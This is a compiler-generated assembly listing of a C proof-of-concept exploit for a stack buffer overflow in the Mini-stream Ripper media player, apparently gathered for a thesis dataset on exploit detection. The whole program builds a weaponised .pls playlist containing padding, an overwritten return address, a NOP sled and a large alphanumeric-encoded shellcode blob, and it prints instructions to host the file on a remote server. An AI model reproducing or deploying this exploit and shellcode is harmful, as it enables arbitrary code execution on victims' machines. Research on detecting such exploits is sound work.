; Listing generated by Microsoft (R) Optimizing Compiler Version 19.28.29913.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

PUBLIC	shell
_DATA	SEGMENT
shell	DB	0ebH, 03H, 'Y', 0ebH, 05H, 0e8H, 0f8H, 0ffH, 0ffH, 0ffH, 'O'
	DB	'IIIIIIQZVTX630VX4A0B6HH0B30BCVX2BDBH4A2AD0ADTBDQB0ADAVX4Z8BDJ'
	DB	'OMNOL6KNODJNIOOOOOOOBVKXNVF2F2K8EDNCKXNGEPJWAPONK8O4JAKXOUBRA'
	DB	'0KNCNBSITK8FSKXA0PNA3BLI9NJFXBLFWG0ALLLMPA0DLKNFOK3FUFBJBEWCN'
	DB	'KXOUFRAPKNH6KXNPK4KHOUNAA0KNC0NRKHI8N6FBNAAVCLACBLFFKHBTB3KXB'
	DB	'DNPK8BGNAMJKHBTJPP5JFPXPDPPNNB5OOHMASKMH6CUHVJ6C3D3JVGGCGD3OU'
	DB	'FUOOBMJVKLMNNOKSBEOOHMO5IHENHVAHMNJPD0EULFDPOOBMJ6IMIPEOMJGUO'
	DB	'OHMCECECUCUCEC4CEC4C5OOBMHVJVAAN5H6C5I8ANEIJFFJLQBWGLGUOOHML6'
	DB	'B1AEE5OOBMJ6FJMJPBINGUOOHMC5E5OOBMJ6ENIDH8ITGUOOHMBUF5FEE5OOB'
	DB	'MCIJVGNI7HLI7GEOOHMEUOOBMH6LVFFH6JFCVMVI8ENLVBUIUIRNLIHGNL6FT'
	DB	'IXDNACBLCOLJPODTM2PODTNRCIMXLGJSKJKJKJJFDWPOCKHQOOEWFTOOHMKEG'
	DB	'5D5A5AUA5LFAPA5AEE5AEOOBMJVMJIME0PLC5OOHMLVOOOOG3OOBMKXGENOC8'
	DB	'FLF6OOHMDUOOBMJ6ONPLBNB6CUOOHMOOBMZ', 00H
_DATA	ENDS
PUBLIC	__local_stdio_printf_options
PUBLIC	_vfprintf_l
PUBLIC	printf
PUBLIC	main
EXTRN	__acrt_iob_func:PROC
EXTRN	fclose:PROC
EXTRN	fopen:PROC
EXTRN	fwrite:PROC
EXTRN	perror:PROC
EXTRN	__stdio_common_vfprintf:PROC
EXTRN	exit:PROC
_DATA	SEGMENT
COMM	?_OptionsStorage@?1??__local_stdio_printf_options@@9@9:QWORD							; `__local_stdio_printf_options'::`2'::_OptionsStorage
_DATA	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$_vfprintf_l DD imagerel $LN3
	DD	imagerel $LN3+67
	DD	imagerel $unwind$_vfprintf_l
pdata	ENDS
;	COMDAT pdata
pdata	SEGMENT
$pdata$printf DD imagerel $LN3
	DD	imagerel $LN3+87
	DD	imagerel $unwind$printf
pdata	ENDS
pdata	SEGMENT
$pdata$main DD	imagerel $LN13
	DD	imagerel $LN13+381
	DD	imagerel $unwind$main
pdata	ENDS
_DATA	SEGMENT
	ORG $+2
$SG11386 DB	'S', 093H, 'B~', 00H
	ORG $+3
$SG11390 DB	'wb', 00H
	ORG $+5
$SG11387 DB	09H, '. .. ... Mini-stream Ripper (.pls) Stack buffer Ove'
	DB	'rflow Exploit ... .. .', 0dH, 0aH, 00H
	ORG $+3
$SG11388 DB	09H, '          -------> now upload the .pls file to a re'
	DB	'mote server <-------', 0aH, 00H
	ORG $+2
$SG11393 DB	'A', 00H
	ORG $+2
$SG11391 DB	'mini-stream-ripper.pls', 00H
	ORG $+1
$SG11392 DB	'Cannot create the exploit file!!! :(', 00H
	ORG $+3
$SG11394 DB	090H, 00H
	ORG $+2
$SG11395 DB	0ccH, 00H
	ORG $+2
$SG11396 DB	'[+] mini-stream-ripper.pls Created successfully! ', 0dH, 0aH
	DB	00H
	ORG $+4
$SG11397 DB	'[+] Exploited by mr_me ', 0dH, 0aH, 00H
_DATA	ENDS
xdata	SEGMENT
$unwind$main DD	010d01H
	DD	0820dH
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$printf DD 011801H
	DD	06218H
xdata	ENDS
;	COMDAT xdata
xdata	SEGMENT
$unwind$_vfprintf_l DD 011801H
	DD	06218H
xdata	ENDS
; Function compile flags: /Odtp
_TEXT	SEGMENT
i$ = 32
expfle$ = 40
EIP$ = 48
argc$ = 80
argv$ = 88
main	PROC
; File C:\Users\matti\Desktop\Magistrale\tesi\poc_detection\temp_dir\dataset_expansion_programs\manella\foobar\exploits_and_permutations\exp0.c
; Line 86
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	DWORD PTR [rsp+8], ecx
	sub	rsp, 72					; 00000048H
; Line 87
	mov	QWORD PTR expfle$[rsp], 0
; Line 88
	lea	rax, OFFSET FLAT:$SG11386
	mov	QWORD PTR EIP$[rsp], rax
; Line 91
	lea	rcx, OFFSET FLAT:$SG11387
	call	printf
; Line 92
	lea	rcx, OFFSET FLAT:$SG11388
	call	printf
; Line 95
	lea	rdx, OFFSET FLAT:$SG11390
	lea	rcx, OFFSET FLAT:$SG11391
	call	fopen
	mov	QWORD PTR expfle$[rsp], rax
	cmp	QWORD PTR expfle$[rsp], 0
	jne	SHORT $LN11@main
; Line 97
	lea	rcx, OFFSET FLAT:$SG11392
	call	perror
; Line 98
	xor	ecx, ecx
	call	exit
$LN11@main:
; Line 101
	mov	DWORD PTR i$[rsp], 0
	jmp	SHORT $LN4@main
$LN2@main:
	mov	eax, DWORD PTR i$[rsp]
	inc	eax
	mov	DWORD PTR i$[rsp], eax
$LN4@main:
	cmp	DWORD PTR i$[rsp], 17405		; 000043fdH
	jge	SHORT $LN3@main
; Line 103
	mov	r9, QWORD PTR expfle$[rsp]
	mov	r8d, 1
	mov	edx, 1
	lea	rcx, OFFSET FLAT:$SG11393
	call	fwrite
; Line 104
	jmp	SHORT $LN2@main
$LN3@main:
; Line 106
	mov	r9, QWORD PTR expfle$[rsp]
	mov	r8d, 1
	mov	edx, 4
	mov	rcx, QWORD PTR EIP$[rsp]
	call	fwrite
; Line 108
	mov	DWORD PTR i$[rsp], 0
	jmp	SHORT $LN7@main
$LN5@main:
	mov	eax, DWORD PTR i$[rsp]
	inc	eax
	mov	DWORD PTR i$[rsp], eax
$LN7@main:
	cmp	DWORD PTR i$[rsp], 10
	jge	SHORT $LN6@main
; Line 110
	mov	r9, QWORD PTR expfle$[rsp]
	mov	r8d, 1
	mov	edx, 1
	lea	rcx, OFFSET FLAT:$SG11394
	call	fwrite
; Line 111
	jmp	SHORT $LN5@main
$LN6@main:
; Line 113
	mov	r9, QWORD PTR expfle$[rsp]
	mov	r8d, 1
	mov	edx, 718				; 000002ceH
	lea	rcx, OFFSET FLAT:shell
	call	fwrite
; Line 115
	mov	DWORD PTR i$[rsp], 0
	jmp	SHORT $LN10@main
$LN8@main:
	mov	eax, DWORD PTR i$[rsp]
	inc	eax
	mov	DWORD PTR i$[rsp], eax
$LN10@main:
	cmp	DWORD PTR i$[rsp], 16702		; 0000413eH
	jge	SHORT $LN9@main
; Line 117
	mov	r9, QWORD PTR expfle$[rsp]
	mov	r8d, 1
	mov	edx, 1
	lea	rcx, OFFSET FLAT:$SG11395
	call	fwrite
; Line 118
	jmp	SHORT $LN8@main
$LN9@main:
; Line 120
	mov	rcx, QWORD PTR expfle$[rsp]
	call	fclose
; Line 122
	lea	rcx, OFFSET FLAT:$SG11396
	call	printf
; Line 123
	lea	rcx, OFFSET FLAT:$SG11397
	call	printf
; Line 125
	xor	eax, eax
$LN12@main:
; Line 127
	add	rsp, 72					; 00000048H
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT printf
_TEXT	SEGMENT
_Result$ = 32
_ArgList$ = 40
_Format$ = 64
printf	PROC						; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 956
$LN3:
	mov	QWORD PTR [rsp+8], rcx
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+32], r9
	sub	rsp, 56					; 00000038H
; Line 959
	lea	rax, QWORD PTR _Format$[rsp+8]
	mov	QWORD PTR _ArgList$[rsp], rax
; Line 960
	mov	ecx, 1
	call	__acrt_iob_func
	mov	r9, QWORD PTR _ArgList$[rsp]
	xor	r8d, r8d
	mov	rdx, QWORD PTR _Format$[rsp]
	mov	rcx, rax
	call	_vfprintf_l
	mov	DWORD PTR _Result$[rsp], eax
; Line 961
	mov	QWORD PTR _ArgList$[rsp], 0
; Line 962
	mov	eax, DWORD PTR _Result$[rsp]
; Line 963
	add	rsp, 56					; 00000038H
	ret	0
printf	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT _vfprintf_l
_TEXT	SEGMENT
_Stream$ = 64
_Format$ = 72
_Locale$ = 80
_ArgList$ = 88
_vfprintf_l PROC					; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\stdio.h
; Line 644
$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
; Line 645
	call	__local_stdio_printf_options
	mov	rcx, QWORD PTR _ArgList$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, QWORD PTR _Locale$[rsp]
	mov	r8, QWORD PTR _Format$[rsp]
	mov	rdx, QWORD PTR _Stream$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	__stdio_common_vfprintf
; Line 646
	add	rsp, 56					; 00000038H
	ret	0
_vfprintf_l ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT __local_stdio_printf_options
_TEXT	SEGMENT
__local_stdio_printf_options PROC			; COMDAT
; File C:\Program Files (x86)\Windows Kits\10\include\10.0.19041.0\ucrt\corecrt_stdio_config.h
; Line 92
	lea	rax, OFFSET FLAT:?_OptionsStorage@?1??__local_stdio_printf_options@@9@9 ; `__local_stdio_printf_options'::`2'::_OptionsStorage
; Line 93
	ret	0
__local_stdio_printf_options ENDP
_TEXT	ENDS
END
